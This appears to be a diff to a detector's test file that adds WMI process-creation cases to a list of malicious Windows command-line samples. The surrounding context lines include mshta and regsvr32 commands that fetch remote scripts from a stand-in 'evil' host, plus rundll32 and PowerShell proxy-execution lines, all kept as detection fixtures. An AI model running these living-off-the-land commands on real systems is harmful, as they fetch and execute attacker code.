@@ -33,6 +33,9 @@ def _check(label: str, ok: bool) -> None:
 MALICIOUS = [
     ("office-spawns-shell", "powershell.exe", "winword.exe", "powershell -nop", ""),
     ("wmic-process-call", "wmic.exe", "cmd.exe", "wmic process call create calc.exe", ""),
+    ("wmi-cim-process-create", "powershell.exe", "explorer.exe",
+     'Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="calc.exe"}', ""),
+    ("wmi-spawned-process", "calc.exe", "wmiprvse.exe", "", ""),
     ("mshta-remote", "mshta.exe", "explorer.exe", "mshta https://evil/x.hta", ""),
     ("regsvr32-scriptlet", "regsvr32.exe", "cmd.exe", "regsvr32 /s /n /u /i:https://evil/x.sct scrobj.dll", ""),
     ("rundll32-proxy", "rundll32.exe", "cmd.exe", "rundll32 javascript:\"\\..\\mshtml,RunHTMLApplication\"", ""),
